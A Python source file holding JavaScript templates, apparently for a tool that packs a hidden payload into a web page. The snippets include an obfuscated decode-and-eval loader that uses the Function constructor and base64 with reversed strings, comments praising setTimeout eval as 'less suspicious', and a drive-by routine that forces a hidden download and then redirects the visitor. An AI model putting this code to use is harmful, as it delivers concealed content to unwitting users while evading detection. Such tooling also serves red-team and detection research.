# This file is for all the JavaScript that I manually wrote and that does not need to be minified

HEXDUMP=r"""function log_hexdump(n,d){let g=[];for(let a=0;a<d.length;a+=16){let e=[],f=[];for(let b=0;16>b;b+=1)if(a+b<d.length){const c=d[a+b];e.push(c.toString(16).padStart(2,"0"));f.push(32<=c&&126>=c?String.fromCharCode(c):".")}else e.push("  "),f.push(" ");g.push(`${a.toString(16).padStart(6,"0")}  ${e.join(" ")}  |${f.join(" ")}|`)}console.log(`Hexdump of ${n}:\n${g.join("\n")}`)};"""

# [].filter.constructor returns the "Function" function constructor. Calling Function(ARGUMENT_NAME, STRING_TO_EVAL)(); is like an eval in a global context. The STRING_TO_EVAL is decoded from the base64+split+reverse+join("-") format that the python code creates
DECODE_AND_EVAL_ACTION="""[].filter[atob("ydWN0b3I=>Y29uc3R".split(">").reverse().join(""))]("og_data",atob("{{OBSCURED_ACTION}}".split("-").map(x=>x.split("").reverse().join("")).join("")))(og_data);"""

# ====== These are the builtin actions =====
# setTimeout works like eval (in a global context) if you pass it a string, but it is less suspicious
JS_EVAL = "setTimeout(new TextDecoder().decode(og_data))"

# since decryption is async we do not catch the onload event anymore
JS_REPLACE = 'setTimeout(()=>{let n=document.open();n.write(new TextDecoder().decode(og_data));n.close()}, 50);'

JS_SHOW_TEXT = 'setTimeout(()=>{let d=document.open(); d.write("<!DOCTYPE html><html><body><style>textarea {width:100vw;height:100vh;padding:0px;margin:0px;border:none;outline: none;white-space: pre-wrap; overflow-x: none;}</style><textarea readonly></textarea></body></html>");d.querySelector("textarea").value=new TextDecoder().decode(og_data)}, 50);'

JS_DOWNLOAD = 'let b=new Blob([og_data],{type:"application/octet-stream"});let u=URL.createObjectURL(b);document.body.innerHTML=`<h1>Unpacked {{NAME}}</h1><a href="${u}" download="{{NAME}}">Click here to download</a>`'

JS_DRIVEBY_REDIRECT = 'let b=new Blob([og_data],{type:"application/octet-stream"});let u=URL.createObjectURL(b);document.body.innerHTML=`<a href="${u}" download="{{NAME}}" id="auto-click"></a>`;document.getElementById("auto-click").click();location.href="{{REDIRECT_URL}}"'

